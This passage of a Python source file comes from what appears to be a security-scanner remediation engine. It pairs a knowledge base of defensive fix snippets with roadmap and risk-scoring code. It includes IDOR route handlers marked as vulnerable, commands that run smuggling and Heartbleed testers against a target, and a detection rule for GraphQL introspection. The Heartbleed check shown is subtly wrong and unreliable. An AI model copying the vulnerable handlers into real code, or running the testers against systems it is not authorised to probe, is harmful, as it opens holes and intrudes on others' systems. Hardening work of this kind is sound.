            "Add all missing security headers at the reverse proxy (nginx/Apache/Cloudflare) "
            "level so they apply uniformly to all responses regardless of application stack."
        ),
        "code_snippets": {
            "nginx": """\
# Add to http {} block in nginx.conf for global effect
# or to server {} block for per-site control
add_header Strict-Transport-Security \
    "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy \
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; \
     img-src 'self' data:; object-src 'none'; base-uri 'self';" always;
add_header X-Frame-Options           "DENY" always;
add_header X-Content-Type-Options    "nosniff" always;
add_header Referrer-Policy           "strict-origin-when-cross-origin" always;
add_header Permissions-Policy \
    "accelerometer=(), camera=(), geolocation=(), microphone=()" always;
# Remove server identification
server_tokens off;
more_clear_headers Server;
more_clear_headers X-Powered-By;""",

            "apache": """\
# httpd.conf or VirtualHost block
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Content-Security-Policy   "default-src 'self'; object-src 'none';"
Header always set X-Frame-Options           "DENY"
Header always set X-Content-Type-Options    "nosniff"
Header always set Referrer-Policy           "strict-origin-when-cross-origin"
Header always set Permissions-Policy        "geolocation=()"
# Remove version banners
ServerTokens Prod
ServerSignature Off
Header unset X-Powered-By""",
        },
        "config_fixes": {
            "cloudflare": """\
# Cloudflare Transform Rules — inject headers for all responses
# Dashboard > Rules > Transform Rules > HTTP Response Headers
# Action: Set > Header: Strict-Transport-Security
# Value: max-age=31536000; includeSubDomains; preload""",
        },
        "references": [
            "OWASP Secure Headers Project",
            "https://securityheaders.com/",
            "MDN — HTTP Headers",
        ],
        "verification": (
            "curl -I https://target.com | grep -i 'strict-transport\\|content-security\\|x-frame'. "
            "All five headers must be present. "
            "Check with securityheaders.com — aim for A+ grade."
        ),
    },

    # ── SPF / DMARC ─────────────────────────────────────────────────────
    "dns_weakness": {
        "title":    "Implement SPF -all and DMARC p=reject",
        "effort":   "short_term",
        "priority": 2,
        "description": (
            "Add an SPF TXT record ending with -all to restrict authorised senders. "
            "Add a DMARC TXT record starting with p=none for monitoring, then "
            "graduate to p=quarantine, then p=reject after reviewing aggregate reports."
        ),
        "code_snippets": {
            "dns_zone": """\
; Add to DNS zone file (or via your DNS provider's dashboard)

; SPF record — replace include: with your actual mail provider
example.com. IN TXT "v=spf1 include:_spf.google.com include:sendgrid.net -all"

; DMARC record — start with p=none, graduate to p=reject
_dmarc.example.com. IN TXT "v=DMARC1; p=none; \
  rua=mailto:dmarc-reports@example.com; \
  ruf=mailto:dmarc-failures@example.com; \
  fo=1; adkim=s; aspf=s"

; After 2-4 weeks of clean reports, change p=none to p=quarantine
; After another 4 weeks, change to p=reject""",

            "bash": """\
#!/bin/bash
# Verify SPF and DMARC after adding records
DOMAIN="example.com"
echo "SPF:"
dig TXT "$DOMAIN" +short | grep "v=spf1"
echo ""
echo "DMARC:"
dig TXT "_dmarc.$DOMAIN" +short
echo ""
echo "--- Validation ---"
# Check SPF result with mxtoolbox
curl -s "https://api.mxtoolbox.com/api/v1/lookup/spf/$DOMAIN" | jq '.Result'""",
        },
        "config_fixes": {
            "postfix": """\
# Enforce inbound SPF/DMARC validation on your own MTA
# /etc/postfix/main.cf
smtpd_recipient_restrictions =
    permit_mynetworks,
    reject_unauth_destination,
    check_policy_service unix:private/policy-spf

# Install opendmarc for inbound DMARC enforcement
apt install opendmarc
# /etc/opendmarc.conf
RejectFailures true
PublicSuffixList /usr/share/publicsuffix/public_suffix_list.dat""",
        },
        "references": [
            "RFC 7208 — Sender Policy Framework",
            "RFC 7489 — Domain-based Message Authentication",
            "https://dmarcguide.globalcyberalliance.org/",
        ],
        "verification": (
            "dig TXT example.com | grep v=spf1 — must end with -all. "
            "dig TXT _dmarc.example.com — p= must be quarantine or reject. "
            "Use mail-tester.com to send a test email and confirm score ≥ 9/10."
        ),
    },

    # ── Credential Leak ─────────────────────────────────────────────────
    "credential_leak": {
        "title":    "Rotate Credentials + Purge from VCS History",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Revoke and rotate every exposed credential immediately. "
            "Remove secrets from repository history using git-filter-repo. "
            "Implement pre-commit hooks and CI/CD secret scanning to prevent recurrence."
        ),
        "code_snippets": {
            "bash": """\
#!/bin/bash
# 1. Rotate the exposed credential immediately via your provider's dashboard
# 2. Remove from git history with git-filter-repo
pip install git-filter-repo

# Remove a specific file containing secrets
git-filter-repo --path .env --invert-paths

# Remove a specific string from all history
git-filter-repo --replace-text <(echo 'EXPOSED_SECRET_VALUE==>REDACTED')

# Force-push to all remotes
git push origin --force --all
git push origin --force --tags

# 3. Install pre-commit hooks
pip install pre-commit detect-secrets
cat > .pre-commit-config.yaml << 'EOF'
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
EOF
pre-commit install

# 4. Add GitHub Actions secret scanning
# Create .github/workflows/secret-scan.yml""",
        },
        "config_fixes": {
            "github": """\
# .github/workflows/secret-scan.yml
name: Secret Scanning
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - name: Scan for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          extra_args: --only-verified""",

            "aws": """\
# Revoke exposed AWS keys immediately
aws iam delete-access-key \\
    --access-key-id EXPOSED_KEY_ID \\
    --user-name affected-user

# Check for any actions taken with the exposed key
aws cloudtrail lookup-events \\
    --lookup-attributes AttributeKey=Username,AttributeValue=affected-user \\
    --start-time $(date -d '30 days ago' --iso-8601=seconds) \\
    --max-results 100 | jq '.Events[] | {time:.EventTime, event:.EventName, ip:.SourceIPAddress}'""",
        },
        "references": [
            "GitHub Secret Scanning",
            "trufflehog — git history secret scanner",
            "git-filter-repo documentation",
        ],
        "verification": (
            "Confirm old credential is rejected (401/403). "
            "Run: trufflehog git file://./repo — must return zero findings. "
            "Rotate all credentials that share the same environment/service."
        ),
    },

    # ── SSL/TLS Vulnerabilities ─────────────────────────────────────────
    "ssl_cve": {
        "title":    "Update TLS Stack + Disable Vulnerable Protocols",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Upgrade OpenSSL to the latest stable version. "
            "Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1. "
            "Enforce TLS 1.2 minimum with strong cipher suites only. "
            "Enable TLS 1.3 for all services."
        ),
        "code_snippets": {
            "bash": """\
# Check current OpenSSL version
openssl version -a

# Ubuntu/Debian — update OpenSSL
apt update && apt install --only-upgrade openssl libssl-dev

# Test for Heartbleed (CVE-2014-0160)
openssl s_client -connect target:443 -tlsextdebug 2>&1 | grep "TLS renegotiation"
# Or use heartbleed-masstest
python heartbleed-test.py target""",
        },
        "config_fixes": {
            "nginx": """\
# nginx.conf — TLS 1.2/1.3 only, strong ciphers
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256;
ssl_prefer_server_ciphers off;
ssl_session_cache    shared:SSL:10m;
ssl_session_timeout  1d;
ssl_session_tickets  off;
ssl_stapling         on;
ssl_stapling_verify  on;
# HSTS
add_header Strict-Transport-Security "max-age=63072000" always;""",

            "apache": """\
# httpd.conf — disable old TLS
SSLProtocol             all -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite          ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
SSLHonorCipherOrder     off
SSLCompression          off
SSLSessionTickets       off
SSLUseStapling          on
SSLStaplingCache        "shmcb:logs/stapling-cache(150000)" """,
        },
        "references": [
            "Mozilla SSL Configuration Generator",
            "RFC 8996 — Deprecating TLS 1.0 and 1.1",
            "https://ssl-config.mozilla.org/",
        ],
        "verification": (
            "testssl.sh --fast target:443 | grep -E 'CRITICAL|HIGH|MEDIUM'. "
            "SSLLabs scan must return A or A+. "
            "Heartbleed, POODLE, FREAK, Logjam must all show 'not vulnerable'."
        ),
    },

    # ── GraphQL ─────────────────────────────────────────────────────────
    "graphql": {
        "title":    "Disable Introspection + Rate Limit + Query Depth Limit",
        "effort":   "short_term",
        "priority": 2,
        "description": (
            "Disable introspection in production to prevent schema enumeration. "
            "Add query depth and complexity limits to prevent DoS via nested queries. "
            "Implement per-operation rate limiting and authentication checks."
        ),
        "code_snippets": {
            "nodejs": """\
// Apollo Server — disable introspection in production
const server = new ApolloServer({
    typeDefs,
    resolvers,
    introspection:    process.env.NODE_ENV !== 'production',
    plugins: [
        // Query depth limiting
        {
            requestDidStart: () => ({
                didResolveOperation: ({ requestContext }) => {
                    const depth = getQueryDepth(requestContext.document);
                    if (depth > 5)
                        throw new Error('Query too deep');
                }
            }),
        },
    ],
});

// Or use graphql-depth-limit package
const depthLimit = require('graphql-depth-limit');
const server = new ApolloServer({
    validationRules: [depthLimit(5)],
    introspection: false,
});""",

            "python": """\
# Graphene + Django — disable introspection
class Query(graphene.ObjectType):
    pass

schema = graphene.Schema(query=Query)

# In settings.py
GRAPHENE = {
    'SCHEMA': 'myapp.schema.schema',
    'MIDDLEWARE': [],
}

# Custom middleware to block introspection in production
class DisableIntrospectionMiddleware:
    def resolve(self, next, root, info, **kwargs):
        if info.field_name in ('__schema', '__type', '__typename'):
            if not settings.DEBUG:
                raise Exception('Introspection disabled')
        return next(root, info, **kwargs)""",
        },
        "config_fixes": {
            "nginx": """\
# Block GraphQL introspection at proxy level
location /graphql {
    # Block requests containing __schema or __type
    if ($request_body ~* "(__schema|__type|__typename)") {
        return 403 '{"error":"Introspection disabled"}';
    }
    proxy_pass http://app_backend;
}""",
        },
        "references": [
            "Apollo GraphQL Security Best Practices",
            "graphql-depth-limit npm package",
            "https://www.apollographql.com/blog/graphql/security/securing-your-graphql-api-from-malicious-queries/",
        ],
        "verification": (
            "POST {\"query\":\"{__schema{types{name}}}\"} to /graphql. "
            "Must return 400/403 or empty types list in production. "
            "POST a 10-level nested query — must be rejected."
        ),
    },

    # ── HTTP Request Smuggling ───────────────────────────────────────────
    "http_request_smuggling": {
        "title":    "Normalise HTTP Parsing at Reverse Proxy Layer",
        "effort":   "short_term",
        "priority": 2,
        "description": (
            "Ensure your reverse proxy and backend agree on how Transfer-Encoding "
            "and Content-Length headers are handled. Upgrade to HTTP/2 end-to-end "
            "where possible. Enable strict HTTP/1.1 parsing mode."
        ),
        "code_snippets": {
            "bash": """\
# Test for CL.TE smuggling with smuggler.py
python3 smuggler.py -u https://target.com/

# Or with Burp Suite HTTP Request Smuggler extension
# Send a 'sync' request to detect discrepancies""",
        },
        "config_fixes": {
            "nginx": """\
# nginx.conf — reject ambiguous Transfer-Encoding headers
# (nginx 1.21.1+ rejects conflicting TE/CL by default)
http {
    # Reject chunked + Content-Length in same request
    # Already handled in nginx >= 1.21.1 — ensure you are up to date
    # Also disable HTTP/1.0 keep-alive to reduce attack surface
    keepalive_timeout 65;

    # Enforce HTTP/2 upstream where possible
    upstream backend {
        server app:8000;
        # keepalive 32;
    }
}""",

            "haproxy": """\
# haproxy.cfg — reject ambiguous requests
defaults
    option http-server-close
    option forwardfor
    # Reject requests with both Content-Length and Transfer-Encoding
    http-request deny if { req.hdr_cnt(Transfer-Encoding) gt 0 } { req.hdr_cnt(Content-Length) gt 0 }""",
        },
        "references": [
            "PortSwigger HTTP Request Smuggling Research",
            "CWE-444: Inconsistent Interpretation of HTTP Requests",
            "https://portswigger.net/web-security/request-smuggling",
        ],
        "verification": (
            "Run smuggler.py and Burp HTTP Request Smuggler against all endpoints. "
            "No CL.TE or TE.CL desync must be detected. "
            "Upgrade nginx to latest stable — includes upstream smuggling fixes."
        ),
    },

    # ── IDOR ────────────────────────────────────────────────────────────
    "idor": {
        "title":    "Object-Level Authorisation on Every Data Access",
        "effort":   "short_term",
        "priority": 2,
        "description": (
            "Before returning any resource, verify that the authenticated user "
            "owns or has permission to access the requested object. "
            "Use opaque random IDs (UUIDs) instead of sequential integers."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE
@app.route('/invoice/<int:invoice_id>')
def get_invoice(invoice_id):
    return Invoice.query.get(invoice_id)   # ← no ownership check

# FIXED — object-level authorisation
@app.route('/invoice/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.filter_by(
        id       = invoice_id,
        owner_id = current_user.id,   # ← ownership enforced at DB level
    ).first_or_404()
    return jsonify(invoice.to_dict())""",

            "nodejs": """\
// VULNERABLE
app.get('/document/:id', async (req, res) => {
    const doc = await Document.findById(req.params.id);
    res.json(doc);
});

// FIXED
app.get('/document/:id', authenticate, async (req, res) => {
    const doc = await Document.findOne({
        _id:    req.params.id,
        userId: req.user.id,    // ← scope to current user
    });
    if (!doc) return res.status(403).json({ error: 'Access denied' });
    res.json(doc);
});""",

            "java": """\
// FIXED — Spring Data JPA — always filter by current user
@Repository
public interface DocumentRepository extends JpaRepository<Document, UUID> {
    // Never findById alone — always scope to owner
    Optional<Document> findByIdAndOwnerId(UUID id, UUID ownerId);
}

// In service:
document = repository.findByIdAndOwnerId(documentId, currentUser.getId())
    .orElseThrow(() -> new AccessDeniedException("Not found"));""",
        },
        "config_fixes": {},
        "references": [
            "OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization",
            "CWE-639: Authorization Bypass Through User-Controlled Key",
        ],
        "verification": (
            "Create two accounts. Access Account A's resource using Account B's session token. "
            "Must return 403, never 200. "
            "Change integer ID to sequential values — no other user's data must be returned."
        ),
    },
}

# Map source keys from vuln_prioritization findings → remediation keys
SOURCE_TO_REMEDIATION: Dict[str, str] = {
    "nmap_vuln_script":    "ssl_cve",
    "ssl_cve":             "ssl_cve",
    "ssl_protocol":        "ssl_cve",
    "header_missing":      "missing_security_headers",
    "header_weak":         "missing_security_headers",
    "subdomain_takeover":  "subdomain_takeover",
    "cname_dangling":      "subdomain_takeover",
    "credential_leak":     "credential_leak",
    "port_exposure":       "port_exposure",
    "dns_weakness":        "dns_weakness",
    "fast_analyst":        "port_exposure",
    "payload_class":       None,   # resolved from vuln_class below
}

# Map vuln_class strings → remediation keys
VULN_CLASS_TO_REMEDIATION: Dict[str, str] = {
    "sqli":               "sqli",
    "sqli_mysql":         "sqli",
    "sqli_mssql":         "sqli",
    "sqli_postgres":      "sqli",
    "sqli_oracle":        "sqli",
    "sqli_generic":       "sqli",
    "xss":                "xss",
    "ssti":               "ssti",
    "ssrf":               "ssrf",
    "cmdi":               "cmdi",
    "path_traversal":     "path_traversal",
    "xxe":                "xxe",
    "nosql":              "nosql",
    "jwt_attacks":        "jwt_attacks",
    "cors_misconfiguration": "cors_misconfiguration",
    "cors_wildcard":      "cors_misconfiguration",
    "graphql":            "graphql",
    "http_request_smuggling": "http_request_smuggling",
    "idor":               "idor",
}


# ---------------------------------------------------------------------------
# Main engine
# ---------------------------------------------------------------------------

class AIRemediationEngine:
    """
    Receives vuln_prioritization.findings and builds a prioritised,
    actionable remediation roadmap with:
        - Code snippets per vuln class and tech stack
        - Config fixes per server/platform
        - Effort / priority / phase assignment
        - Deduplication across findings that map to the same fix
        - AI narrative (Groq) for executive summary + risk delta

    Slot in run_scan() after vuln_prioritization:
        engine = AIRemediationEngine(groq_api_key=GROQ_API_KEY)
        scan_results[scan_id]['remediation_plan'] = engine.build(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(self, groq_api_key: str = GROQ_API_KEY, timeout: int = 45):
        self.groq_api_key = groq_api_key
        self.timeout      = timeout
        self.logger       = logging.getLogger(__name__)

        if not self.logger.handlers:
            h = logging.StreamHandler()
            h.setFormatter(logging.Formatter(
                "%(asctime)s [%(levelname)s] AIRemediationEngine — %(message)s"
            ))
            self.logger.addHandler(h)
            self.logger.setLevel(logging.INFO)

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def build(self, domain: str, scan_results: Dict) -> Dict:
        """
        Args:
            domain:       Target domain.
            scan_results: Full ARTEX scan_results dict.

        Returns dict:
            {
                roadmap:         [{phase, items:[remediation_item]}]
                remediation_items: [all deduplicated items, sorted by priority]
                quick_wins:        [items effort=immediate]
                risk_delta:        {before_score, after_score, reduction_pct}
                tech_specific:     {language/framework → [relevant_items]}
                coverage_map:      {vuln_class → remediation_key}
                ai_analysis:       Groq executive narrative (or None)
                scan_metadata
            }
        """
        self.logger.info(f"Building remediation plan — domain: {domain}")
        start = time.time()

        # ── Extract inputs ────────────────────────────────────────────
        vp       = scan_results.get("vuln_prioritization", {})
        findings = vp.get("prioritized", vp.get("findings", []))
        overall  = vp.get("overall_risk", {})
        chains   = vp.get("attack_chains", [])
        sev_counts = vp.get("severity_counts", {})
        asset_map  = vp.get("asset_risk_map", {})

        # Tech profile from payload_analysis or tech_detection
        tech_profile = self._extract_tech_profile(scan_results)

        # ── Map each finding → remediation key ───────────────────────
        coverage_map: Dict[str, str]        = {}
        item_map:     Dict[str, Dict]       = {}   # remediation_key → enriched item

        for finding in findings:
            rem_key = self._resolve_remediation_key(finding)
            if not rem_key or rem_key not in REMEDIATION_KB:
                continue
            coverage_map[finding.get("vuln_id", "")] = rem_key

            if rem_key in item_map:
                # Merge finding references into existing item
                item_map[rem_key]["finding_refs"].append({
                    "vuln_id":  finding.get("vuln_id", ""),
                    "title":    finding.get("title", "")[:80],
                    "severity": finding.get("severity", "?"),
                    "score":    finding.get("final_score", 0),
                    "asset":    finding.get("affected_asset", ""),
                })
                # Escalate severity if needed
                current_sev  = item_map[rem_key]["severity"]
                new_sev      = finding.get("severity", "info")
                if SEV_ORDER.get(new_sev, 0) > SEV_ORDER.get(current_sev, 0):
                    item_map[rem_key]["severity"] = new_sev
            else:
                kb   = REMEDIATION_KB[rem_key]
                item = self._build_item(
                    rem_key, kb, finding, tech_profile
                )
                item_map[rem_key] = item

        # ── Build standalone items for attack chains ──────────────────
        for chain in chains:
            chain_name = chain.get("chain_name", "")
            if not chain_name:
                continue
            # Map chain sources to remediation items
            for src in chain.get("finding_sources", []):
                rk = SOURCE_TO_REMEDIATION.get(src)
                if rk and rk in REMEDIATION_KB and rk not in item_map:
                    kb   = REMEDIATION_KB[rk]
                    item = self._build_item_from_chain(rk, kb, chain, tech_profile)
                    item_map[rk] = item

        # ── Sort all items ────────────────────────────────────────────
        all_items = sorted(
            item_map.values(),
            key=lambda x: (
                x["priority_order"],
                -SEV_ORDER.get(x["severity"], 0),
            ),
        )

        # ── Bucket into roadmap phases ────────────────────────────────
        roadmap = self._build_roadmap(all_items)

        # ── Quick wins ────────────────────────────────────────────────
        quick_wins = [
            item for item in all_items
            if item["effort"] == "immediate"
        ]

        # ── Risk delta estimate ───────────────────────────────────────
        risk_delta = self._estimate_risk_delta(
            overall, sev_counts, all_items
        )

        # ── Tech-specific grouping ────────────────────────────────────
        tech_specific = self._group_by_tech(all_items, tech_profile)

        # ── AI enrichment ─────────────────────────────────────────────
        ai_result = None
        if self.groq_api_key and all_items:
            ai_result = self._ai_analysis(
                domain, all_items, roadmap, risk_delta,
                overall, sev_counts, chains
            )

        duration = round(time.time() - start, 2)
        self.logger.info(
            f"Remediation plan complete — {len(all_items)} items, "
            f"{len(quick_wins)} quick wins in {duration}s"
        )

        return {
            "roadmap":           roadmap,
            "remediation_items": all_items,
            "quick_wins":        quick_wins,
            "risk_delta":        risk_delta,
            "tech_specific":     tech_specific,
            "coverage_map":      coverage_map,
            "ai_analysis":       ai_result,
            "scan_metadata": {
                "domain":                domain,
                "scan_duration_seconds": duration,
                "timestamp":             datetime.now().isoformat(),
                "ai_model":              "Groq Llama3-70B" if ai_result else "Rule-based only",
                "total_items":           len(all_items),
                "findings_covered":      len(coverage_map),
            },
        }

    # ------------------------------------------------------------------
    # Key resolvers
    # ------------------------------------------------------------------

    @staticmethod
    def _resolve_remediation_key(finding: Dict) -> Optional[str]:
        source = finding.get("source", "")
        # Direct source mapping
        mapped = SOURCE_TO_REMEDIATION.get(source)
        if mapped:
            return mapped
        # Try from title keywords
        title  = finding.get("title", "").lower()
        for class_key, rem_key in VULN_CLASS_TO_REMEDIATION.items():
            if class_key in title:
                return rem_key
        # Try from vuln_id prefix
        vuln_id = finding.get("vuln_id", "")
        for prefix, rem_key in {
            "SSL":    "ssl_cve",
            "HDR":    "missing_security_headers",
            "TKOVER": "subdomain_takeover",
            "DANGLE": "subdomain_takeover",
            "CRED":   "credential_leak",
            "PORT":   "port_exposure",
            "DNS":    "dns_weakness",
            "VCLS":   None,
        }.items():
            if vuln_id.startswith(prefix):
                if rem_key:
                    return rem_key
                # For VCLS, resolve from title
                break
        # Fallback — scan evidence for vuln_class
        evidence = finding.get("evidence", {})
        vc       = evidence.get("vuln_class", "")
        return VULN_CLASS_TO_REMEDIATION.get(vc)

    # ------------------------------------------------------------------
    # Item builders
    # ------------------------------------------------------------------

    def _build_item(
        self,
        rem_key:      str,
        kb:           Dict,
        finding:      Dict,
        tech_profile: Dict,
    ) -> Dict:
        lang    = tech_profile.get("language", "").lower()
        snippet = self._pick_snippet(kb, lang)
        config  = self._pick_config(kb, tech_profile)

        effort_order = {"immediate": 1, "short_term": 2, "long_term": 3}

        return {
            "remediation_id":  hashlib.md5(rem_key.encode()).hexdigest()[:10],
            "remediation_key": rem_key,
            "title":           kb["title"],
            "effort":          kb["effort"],
            "priority_order":  effort_order.get(kb["effort"], 2),
            "priority_label":  kb["effort"].replace("_", " ").title(),
            "severity":        finding.get("severity", "medium"),
            "description":     kb["description"],
            "code_snippet":    snippet,
            "config_fix":      config,
            "verification":    kb.get("verification", ""),
            "references":      kb.get("references", []),
            "finding_refs": [{
                "vuln_id":  finding.get("vuln_id", ""),
                "title":    finding.get("title", "")[:80],
                "severity": finding.get("severity", "?"),
                "score":    finding.get("final_score", 0),
                "asset":    finding.get("affected_asset", ""),
            }],
        }

    def _build_item_from_chain(
        self,
        rem_key:      str,
        kb:           Dict,
        chain:        Dict,
        tech_profile: Dict,
    ) -> Dict:
        lang    = tech_profile.get("language", "").lower()
        snippet = self._pick_snippet(kb, lang)
        config  = self._pick_config(kb, tech_profile)
        effort_order = {"immediate": 1, "short_term": 2, "long_term": 3}

        return {
            "remediation_id":  hashlib.md5(rem_key.encode()).hexdigest()[:10],
            "remediation_key": rem_key,
            "title":           kb["title"],
            "effort":          kb["effort"],
            "priority_order":  effort_order.get(kb["effort"], 2),
            "priority_label":  kb["effort"].replace("_", " ").title(),
            "severity":        chain.get("severity", "medium"),
            "description":     kb["description"],
            "code_snippet":    snippet,
            "config_fix":      config,
            "verification":    kb.get("verification", ""),
            "references":      kb.get("references", []),
            "finding_refs": [{
                "vuln_id":  f"chain_{chain.get('chain_name','')}",
                "title":    chain.get("chain_name", ""),
                "severity": chain.get("severity", "?"),
                "score":    0,
                "asset":    "",
            }],
        }

    @staticmethod
    def _pick_snippet(kb: Dict, lang: str) -> Dict:
        snippets = kb.get("code_snippets", {})
        if not snippets:
            return {}
        lang_map = {
            "php":    "php",
            "python": "python",
            "ruby":   "ruby",
            "java":   "java",
            "node":   "nodejs",
            "nodejs": "nodejs",
            "javascript": "nodejs",
            "csharp": "csharp",
            ".net":   "csharp",
            "bash":   "bash",
        }
        preferred = lang_map.get(lang)
        if preferred and preferred in snippets:
            return {preferred: snippets[preferred]}
        # Return first three available
        return dict(list(snippets.items())[:3])

    @staticmethod
    def _pick_config(kb: Dict, tech_profile: Dict) -> Dict:
        config_fixes = kb.get("config_fixes", {})
        if not config_fixes:
            return {}
        web_server = tech_profile.get("web_server", "").lower()
        if "nginx" in web_server and "nginx" in config_fixes:
            return {"nginx": config_fixes["nginx"]}
        if "apache" in web_server and "apache" in config_fixes:
            return {"apache": config_fixes["apache"]}
        # Return first two
        return dict(list(config_fixes.items())[:2])

    # ------------------------------------------------------------------
    # Tech profile extraction
    # ------------------------------------------------------------------

    @staticmethod
    def _extract_tech_profile(scan_results: Dict) -> Dict:
        profile = {
            "language":  "",
            "framework": "",
            "database":  "",
            "cms":       "",
            "web_server": "",
        }
        pa = scan_results.get("payload_analysis", {})
        if pa.get("tech_profile"):
            tp = pa["tech_profile"]
            profile["language"]   = tp.get("language", "")
            profile["framework"]  = tp.get("framework", "")
            profile["database"]   = tp.get("database", "")
            profile["cms"]        = tp.get("cms", "")
            profile["web_server"] = tp.get("web_server", "")
            return profile

        # Fallback — extract from tech_detection
        for url, tech_data in scan_results.get("tech_detection", {}).items():
            if not isinstance(tech_data, dict):
                continue
            for t in tech_data.get("technologies", []):
                name = t.get("name", "").lower()
                cat  = t.get("category", "").lower()
                if not profile["web_server"] and any(
                    s in name for s in ["nginx", "apache", "iis", "caddy"]):
                    profile["web_server"] = name
                if not profile["language"] and any(
                    s in name for s in ["php", "python", "ruby", "java", "node"]):
                    profile["language"] = name
                if not profile["framework"] and any(
                    s in name for s in ["django", "flask", "rails", "spring",
                                        "laravel", "express", "wordpress"]):
                    profile["framework"] = name
                if not profile["database"] and any(
                    s in name for s in ["mysql", "postgres", "mongodb",
                                        "mssql", "redis", "oracle"]):
                    profile["database"] = name
        return profile

    # ------------------------------------------------------------------
    # Roadmap builder
    # ------------------------------------------------------------------

    @staticmethod
    def _build_roadmap(items: List[Dict]) -> List[Dict]:
        PHASE_LABELS = {
            "immediate":   "Phase 1 — Immediate (0–7 days)",
            "short_term":  "Phase 2 — Short Term (8–30 days)",
            "long_term":   "Phase 3 — Long Term (31–90 days)",
        }
        buckets: Dict[str, List[Dict]] = {
            "immediate":  [],
            "short_term": [],
            "long_term":  [],
        }
        for item in items:
            bucket = item.get("effort", "short_term")
            if bucket not in buckets:
                bucket = "short_term"
            buckets[bucket].append(item)

        roadmap = []
        for effort_key, phase_label in PHASE_LABELS.items():
            phase_items = buckets[effort_key]
            if not phase_items:
                continue
            roadmap.append({
                "phase":       phase_label,
                "effort":      effort_key,
                "item_count":  len(phase_items),
                "items":       phase_items,
                "summary":     (
                    f"{len(phase_items)} remediation action"
                    f"{'s' if len(phase_items) != 1 else ''} required: "
                    + ", ".join(item["title"] for item in phase_items[:3])
                    + ("..." if len(phase_items) > 3 else ".")
                ),
            })
        return roadmap

    # ------------------------------------------------------------------
    # Risk delta
    # ------------------------------------------------------------------

    @staticmethod
    def _estimate_risk_delta(
        overall:    Dict,
        sev_counts: Dict,
        items:      List[Dict],
    ) -> Dict:
        before_score = float(overall.get("score", 0))

        # Each immediate fix reduces score by severity-weighted amount
        reduction = 0.0
        for item in items:
            sev    = item.get("severity", "low")
            effort = item.get("effort", "short_term")
            weight = {
                "critical": 20.0,
                "high":     12.0,
                "medium":    6.0,
                "low":       2.0,
                "info":      0.5,
            }.get(sev, 2.0)
            # Immediate fixes reduce more
            multiplier = {"immediate": 1.0, "short_term": 0.6, "long_term": 0.3}.get(effort, 0.5)
            reduction += weight * multiplier

        # Cap reduction at before_score
        after_score = max(0.0, before_score - reduction)
        pct         = round((reduction / before_score * 100), 1) if before_score > 0 else 0.0

        return {
            "before_score":          round(before_score, 1),
            "after_score":           round(after_score, 1),
            "estimated_reduction":   round(reduction, 1),
            "reduction_pct":         pct,
            "crit_before":           sev_counts.get("critical", 0),
            "high_before":           sev_counts.get("high", 0),
            "note":                  (
                "Estimated score reduction if all roadmap items are implemented. "
                "Actual reduction depends on correct implementation and verification."
            ),
        }

    # ------------------------------------------------------------------
    # Tech-specific grouping
    # ------------------------------------------------------------------

    @staticmethod
    def _group_by_tech(items: List[Dict], tech_profile: Dict) -> Dict[str, List[Dict]]:
        groups: Dict[str, List[Dict]] = defaultdict(list)

        for item in items:
            snippets    = item.get("code_snippet", {})
            config_fix  = item.get("config_fix", {})

            for lang in snippets:
                groups[lang].append({
                    "title":        item["title"],
                    "effort":       item["effort"],
                    "severity":     item["severity"],
                    "snippet":      snippets[lang],
                    "verification": item.get("verification", ""),
                })

            for platform in config_fix:
                groups[platform].append({
                    "title":       item["title"],
                    "effort":      item["effort"],
                    "severity":    item["severity"],
                    "config":      config_fix[platform],
                    "verification": item.get("verification", ""),
                })

        return dict(groups)

    # ------------------------------------------------------------------
    # Pass 2 — Groq AI analysis
    # ------------------------------------------------------------------

    def _ai_analysis(
        self,
        domain:     str,
        items:      List[Dict],
        roadmap:    List[Dict],
        risk_delta: Dict,
        overall:    Dict,
        sev_counts: Dict,
        chains:     List[Dict],
    ) -> Optional[Dict]:
        try:
            prompt = self._build_prompt(
                domain, items, roadmap, risk_delta,
                overall, sev_counts, chains
            )
            text = self._call_groq(prompt)
            if not text:
                return None
            return self._parse_ai_response(text)
        except Exception as e:
            self.logger.error(f"AI analysis failed: {e}")
            return None

    def _build_prompt(
        self,
        domain:     str,
        items:      List[Dict],
        roadmap:    List[Dict],
        risk_delta: Dict,
        overall:    Dict,
        sev_counts: Dict,
        chains:     List[Dict],
    ) -> str:
        condensed_items = []
        for item in items[:12]:
            condensed_items.append({
                "title":    item["title"],
                "effort":   item["effort"],
                "severity": item["severity"],
                "findings": len(item.get("finding_refs", [])),
            })

        roadmap_summary = [
            {
                "phase": r["phase"],
                "items": r["item_count"],
                "summary": r["summary"],
            }
            for r in roadmap
        ]

        return f"""You are a lead security consultant preparing a remediation briefing for {domain}.
Return ONLY valid JSON.

Overall Risk: {overall.get('level','?')} (score {overall.get('score',0)}/100)
Severity counts: {json.dumps(sev_counts, indent=2)}
Risk delta (estimated): before={risk_delta['before_score']} → after={risk_delta['after_score']} ({risk_delta['reduction_pct']}% reduction)

Remediation items planned ({len(items)} total):
{json.dumps(condensed_items, indent=2)}

Roadmap phases:
